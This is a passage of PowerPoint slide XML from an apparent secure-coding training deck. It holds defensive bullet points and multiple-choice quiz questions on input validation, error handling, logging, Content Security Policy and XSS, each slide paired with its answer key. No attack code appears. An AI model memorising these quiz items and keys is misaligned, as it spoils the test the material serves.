              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Use parameterized queries to prevent injection attacks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Restrict direct DB access.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Mark cookies as </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>HttpOnly</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>Secure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" lvl="0" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Detect anomalies in requests (e.g., price mismatch, unexpected role changes).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="425450" indent="-285750">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t>Enable </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" b="1" dirty="0"/>
              <a:t>audit trails</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-IN" sz="1800" dirty="0"/>
              <a:t> to trace tampering attempts.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="281591799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053B5-F7FE-7DAB-7562-38BC49C439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C5D418-6DF1-C577-A5D2-477EA359E804}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: b)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{40D0DCBD-7D6B-0100-31A4-82F86E770DDE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>What is the primary purpose of input validation?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) Improve user interface design</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) Enhance application security by verifying data</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) Reduce application load time</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) Optimize database queries</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3171420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7C6E4-EEE4-908B-1BCE-541FB582A4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6B8402-A546-1011-BD38-0FE1BD8197C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: c)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A7B8452F-6B0F-D17F-A9F2-DFC728809C32}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Which of the following is a secure error handling practice?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) Display detailed error messages to users</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) Log errors with full stack traces exposed publicly</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) Show generic error messages to users while logging details internally</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) Suppress all error messages</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1244611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B07D5-51E4-334E-3093-44AE60F790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1E9400-5650-8142-5BEA-140800B71BF5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: b)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7F792E86-9F14-CEF8-649C-93B976C3E66F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Why is logging important in application security?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) To improve page load speed</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) To detect and investigate security incidents</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) To optimize memory usage</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) To simplify database queries</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3930509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AFEE5-C0D5-7BE5-F7A0-F0F7F3E610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82FB24-4B21-6E00-1018-632D317E92B0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: b)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8922DF47-FE2C-E261-7C8C-8D0425C606A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>What is the main function of a Content Security Policy (CSP)?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) Reduce memory consumption</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) Restrict the sources from which content can be loaded</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) Improve application design</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) Provide user role management</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3883422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17CB7-A72C-0656-AE71-6B546F5339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461486-1CC3-F02D-83E7-485C3B12F1FD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: d)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D93DDC3E-A69E-4BC5-5C2B-EFE6456B7135}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" b="1" dirty="0"/>
              <a:t>Which logging practice BEST balances security and debugging needs?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>a) Storing all logs on the client-side for easy access</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>b) Logging every request parameter without filtering</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>c) Using verbose error messages in production logs</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-IN" sz="2400" dirty="0"/>
              <a:t>d) Centralizing logs securely, masking sensitive fields, and monitoring for anomalies</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3511635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8AC56-725F-9E66-227C-8B0E19387C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3880AA-0426-778C-4DB3-2233497003F3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: c)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{80E46C08-42D8-1B0B-9FD6-B0075838CD34}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Which of the following is NOT a sensitive data protection method?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) Encryption</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) Tokenization</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) Plaintext storage</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) Hashing</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2177956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7ED88-BB9D-D11D-D1B5-407E54778A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CF45C5-B61E-05D7-5691-5A6D8AD8BD23}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: c)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E4BABFC7-B92D-E31E-127E-082D700D54C4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Which attack attempts to inject malicious JavaScript into a web page?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) SQL Injection</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) Path Traversal</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) Cross-Site Scripting (XSS)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) Command Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3065495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11F5A-C472-892F-1FAC-5E2A26ED8C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900552-FA53-D367-83D9-04469B3A30E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: d)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C0B2C517-A0E1-429F-C716-B88B516E0C10}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Which of the following best prevents reflected XSS when user input is rendered in HTML attributes?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) Client-side validation only</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) URL encoding of input</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) Using HTTPS to encrypt traffic</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) Context-aware output encoding specific to HTML attributes</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1688051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A001E-1B42-55B6-CF69-AF0EB127F5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831EFA-7301-AD42-FBE3-69C2F947D07E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="3884813"/>
            <a:ext cx="7704000" cy="572700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-IN" dirty="0"/>
              <a:t>Answer: d)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8CEF2FDF-5A79-0ED3-A647-87A0B2021343}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="772388" y="506136"/>
            <a:ext cx="7704000" cy="3132413"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>When designing a Content Security Policy (CSP), which configuration offers the strongest defense against XSS?</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>a) Allowing inline scripts but blocking external domains</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>b) Using a whitelist of trusted script sources without nonces</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>c) Enabling only default-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> * for all content types</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>d) Using nonces/hashes for scripts, disallowing inline JavaScript, and restricting sources to trusted domains</a:t>
            </a:r>
            <a:endParaRPr lang="en-IN" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1782785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A51B4-A678-EA4F-C2AF-06A83769C3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1A5680-144B-A971-D0CB-8714985E1770}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
